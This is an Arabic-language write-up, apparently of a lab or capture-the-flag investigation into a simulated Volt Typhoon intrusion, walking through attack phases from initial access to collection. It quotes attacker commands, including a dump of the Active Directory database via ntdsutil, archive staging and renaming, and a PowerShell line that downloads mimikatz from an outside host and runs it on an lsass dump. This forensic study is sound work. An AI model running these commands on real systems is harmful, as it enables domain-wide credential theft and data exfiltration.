1 - Initial Access
المهاجم قام بتغيير كلمة المرور للمستخدم 	dean-admin واختراق حسابه بعد ذلك قام المهاجم بفترة وجيزة بانشاء حساب مدير جديد وبعد متابعة التسلسل الزمني تبين ان المهاجم قد أنشأ  الحساب الجديد باسم 	voltyp-admin بعد اختراق الجهاز بدقيقة ثم فتح الحساب وغير كلمة المرور وسؤال الأمان ومرحلة ال Multi-factor Authentication (MFA) 
- voltyp-admin, Enrollment, completed, web_browser
- voltyp-admin, Account Unlock, completed, web_browser
- voltyp-admin, Password Change, completed, web_browser
- voltyp-admin, Security Question Setup, completed, web_browser 
- Multi-factor Authentication (MFA) Setup, completed, web_browser


2 - Execution
- وفي محاولة لجمع المعلومات قام المهاجم بتشغيل أمر "wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename" للعثور علي معلومات  حول محركات الأقراص المحلية على الخادمين server01 و server02 وقد تم هذا الأمر في هذا الوقت	2024-03-25T21:30:03 من ال IP Address "192.168.1.153" 
- يستخدم المهاجم أداة ntdsutil لإنشاء نسخة من قاعدة بيانات Active Directory وقام بتشغيل الأمر التالي
wmic process call create "cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe "ac i ntds" "ifm create full C:\Windows\Temp\tmp\temp.dit"" | executed | success |	
- المخترق استخدم هذا الأمر wmic /node:webserver-01 process call create “cmd.exe /c xcopy C:\Windows\Temp\tmp\temp.dit \webserver-01\c$\inetpub\wwwroot” لتهريب قاعدة البيانات المسروقة من جهاز الدومين كونتورلر (Domain Controller) إلى السيرفر الخاص بالموقع (webserver-01)
- المخترق  استخدم أداة الضغط 7z (7-Zip) عشان يجهز الملف للسرقة النهائية ونفذ هذا الأمر 
	wmic /node:webserver-01 process call create “cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit”	
حيث يتواجد فيه password التي عينها المهاجم للأرشيف


3 - Persistence
- لضمان استمرارية الوصول إلى الخادم المخترق، أنشأ المهاجم برنامجًا خبيثًا (ويب شيل) باستخدام نص مشفر بتقنية Base64 وقد تم وضع برنامج تشغيل الويب في المجلد C:\Windows\Temp\


4 - Defense Evasion
- في محاولة لإخفاء آثارهم، قام المهاجمون بإزالة أدلة الاختراق. بدأوا أولاً بمسح سجلات بروتوكول سطح المكتب البعيد (RDP) وقد استخدم المهاجم أمر Remove-ItemProperty لأزالة سجل الأكثر استخداما مؤخرا
- يواصل المهاجمون إخفاء آثارهم عن طريق إعادة تسمية وتغيير امتداد الملفات المضغوطة التي أنشأوها سابقًا وقد بتغيير الملف عن طريق هذا الأمر 
	wmic /node:webserver-01 process call create "cmd.exe /c ren \webserver-01\c$\inetpub\wwwroot\cisco-up.7z cl64.gif"
- المخترق حاول يعمل حاجة اسمها Anti-Virtualization أو Anti-VM ودي خطوة دفاعية منه عشان يتأكد هل هو مخترق "سيرفر حقيقي" ولا هو وقع في فخ (Honeypot) أو بيتحلل داخل "بيئة افتراضية" (Virtual Machine) وكان التحقق من هذا المسار HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control


5 - Credential Access
- باستخدام استعلام السجل (reg query)، يبحث برنامج فولت تايفون عن فرص للعثور على بيانات اعتماد مفيدة وقد فحص هذه البرامج الثلاثة OpenSSH, putty, realvnc
- وقد استخدم المهاجم لتنزيل امرا مشفرا base64 لتنزيل وتشغيل برنامج mimikatz وهذا هو الأمر 
Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait


6 - Discovery
- استخدم المهاجم أداة wevtutil، وهي أداة لاستخراج سجلات النظام، لحصر سجلات نظام ويندوز. وكانت معرفات الأحداث التي بحث عنها المهاجم هي 4624 4625 4769


7 - Lateral Movement
- بالانتقال جانبياً إلى الخادم server-02، قام المهاجم بنسخ واجهة الويب الأصلية وقد استخدم المهاجم هذا الأمر 
Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx


8 - Collection
- يستطيع المهاجم تحديد بعض المعلومات المالية القيّمة خلال مرحلة جمع البيانات.وقد قام المهاجم بنسخ ثلاثة ملفات باستخدام باور شيل 2022.csv 2023.csv 2024.csv باستخدام هذا الأمر 
Copy-Item -Path "C:\ProgramData\FinanceBackup\2023.csv" -Destination "C:\Windows\Temp\faudit\.*csv"


